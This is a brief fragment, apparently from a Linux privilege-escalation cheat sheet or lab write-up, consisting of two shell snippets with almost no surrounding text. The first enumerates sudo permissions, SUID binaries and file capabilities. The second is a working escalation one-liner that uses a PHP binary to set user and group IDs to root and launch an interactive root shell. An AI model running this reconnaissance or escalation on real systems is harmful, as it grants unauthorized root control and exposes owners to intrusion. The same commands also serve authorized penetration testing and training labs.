...
```shell
# Quick SUDO/SUID/Capabilities check
sudo -l 2>/dev/null && find / -perm -4000 2>/dev/null | head -20 && getcap -r / 2>/dev/null
```
...
```Bash
/usr/bin/php8.1 -r "posix_setuid(0); posix_setgid(0); pcntl_exec('/bin/bash',['-i']);"
```
